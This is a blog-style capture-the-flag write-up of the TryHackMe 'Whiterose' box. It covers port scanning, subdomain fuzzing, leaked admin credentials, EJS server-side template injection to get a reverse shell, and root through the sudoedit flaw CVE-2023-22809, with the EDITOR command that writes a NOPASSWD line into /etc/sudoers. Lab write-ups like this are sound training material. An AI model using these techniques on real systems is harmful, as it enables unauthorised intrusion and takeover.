---
title: "TryHackMe - Whiterose"
permalink: /CTFs/THM-Whiterose/
date: 2024-10-31
categories: [TryHackMe]
tags: [TryHackMe, Linux, SSTI]
---

Another Mr. Robot themed box.

`Rustscan` indicated that just two ports were open, so I used nmap to check both of them.

``` bash
# Nmap 7.94SVN scan initiated Thur Oct  31 09:17:50 2024 as: /usr/lib/nmap/nmap --privileged -sC -sV -p 22,80 -T4 -oN nmap.scan -vv cyprusbank.thm
Nmap scan report for cyprusbank.thm (10.10.194.247)
Host is up, received echo-reply ttl 63 (0.17s latency).
Scanned at 2024-11-01 09:17:50 EET for 11s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCddbej9ZSf75uuDvLDeym5AYM+loP/3W862HTWjmksh0UuiuIz8UNTrf3ZpgtBej4y3E3EKvOmYFvJHZpFRV/hQBq1oZB3+XXVzb5RovazcnMgvFxI4y5nCQM8qTW09YvBOpzTyYmsKjVRJOfLR+F87g90vNdZ/u8uVl7IH0B6NmhGlCjPMVLRmhz7PuZih38t0WRWPruEY5qGliW0M3ngZXL6MmL1Jo146HtM8GASdt6yV9U3GLa3/OMFVjYgysqUQPrMwvUrQ8tIDnRAH1rsKBxDFotvcfW6mJ1OvojQf8PEw7iI/PNJZWGzkg+bm4/k+6PRjO2v/0V98DlU+gnn
|   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNMBr/zXjVQItMqdVH12/sZ3rIt2XFsPWRCy4bXCE7InUVg8Q9SVFkOW2LAi1UStP4A4W8yA8hW+1wJaEFP9ffs=
|   256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIdJAkvDVqEAbac77yxYfkM0AU8puWxCyqCBJ9Pd9zCi
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: nginx/1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  1 09:18:01 2024 -- 1 IP address (1 host up) scanned in 10.65 seconds
```
So the machine is running Ubuntu, and from the OpenSSH version it's most likely running Ubuntu 18.04

Next thing was checking the webapp that was running on port 80, but there was nothing
![image](/assets/img/CTFs/Whiterose/index.png)

I tried bruteforcing the directories next, but it was ineffective, so I tried subdomain enum using ffuf
``` bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.cyprusbank.thm" -u http://10.10.194.247 -fs 57
```
and I got `admin` so I added it into hosts file and accessed it
![image](/assets/img/CTFs/Whiterose/login.png)
I used the credentials that was provided on the challenge page to log in.

after playing around I found an endpoint named `messages` had a query parameter of 5, after messing with it it yielded one of the administrators' username and password
![image](/assets/img/CTFs/Whiterose/messages.png)
I logged in and I was able to see Tyler's Welleck phone number.

---
## Foothold

After looking around again  I was able to access `settings`, which I was unable to access using Olivia's creds.
I noticed that whatever I type it gets rendered on the page
![image](/assets/img/CTFs/Whiterose/weird.png)

So I fired up Burp and intercepted the request. I sent it to the repeater and messed with the parameters a bit and tried different payloads in the `password` but it was escaping everything. So I got rid of the `password` parameter and it hit server error
![image](/assets/img/CTFs/Whiterose/burp1.png)
I noticed it was using `Express` as a backend server. So it can be a SSTI (Server-side template injection). This can potentially allow to inject malicious code into the `password` parameter.

After some googling I stumbled across this writeup [CVE-2022-29078](https://eslam.io/posts/ejs-server-side-template-injection-rce/)
I tried several things, and it seemed promising.
![image](/assets/img/CTFs/Whiterose/burp2.png)

Tried different shells from [revshells](https://www.revshells.com/) and I was able to get a shell
![image](/assets/img/CTFs/Whiterose/foothold.png)

---
## PrivEsc
I like to try different things before fire up linpeas so I tried `sudo -l`
![image](/assets/img/CTFs/Whiterose/sudo.png)
after some googling it could be vulnerable to [CVE-2023-22809](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf) which it is since Versions 1.8.0 through 1.9.12p1 are the ones impacted.
![image](/assets/img/CTFs/Whiterose/sudoVersion.png)

after understanding how it works what I did was like this:
```bash
export EDITOR="vim -- /etc/sudoers"
web ALL=(ALL:ALL) NOPASSWD:ALL # added this in the sudors file
```
then saved the changes. If we typed sudo -l we can see that the sudeors file is updated
![image](/assets/img/CTFs/Whiterose/root.png)
